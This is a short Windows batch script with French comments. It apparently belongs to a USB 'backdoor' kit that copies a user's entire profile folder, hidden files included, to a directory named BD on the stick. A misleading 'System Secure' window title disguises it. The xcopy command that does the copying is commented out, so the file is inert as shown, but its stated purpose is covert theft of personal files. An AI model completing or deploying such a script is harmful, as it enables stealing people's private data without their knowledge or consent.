@echo off
::Ce fichier batch (Launch.bat) palcé dans une clé avec les fichiers: ctusbag.exe, usbagent.inf, DD.ico 
::permet de copier tous les fichiers se trouvant à USER sur la cle dans un dossiers appelé BD (backdoor)
title System Secure 
mode con cols=40 lines=10
cd\
::xcopy "C:\Users\%username%" "\BD" /E /D /C /H /K /I /Y
pause
exit
 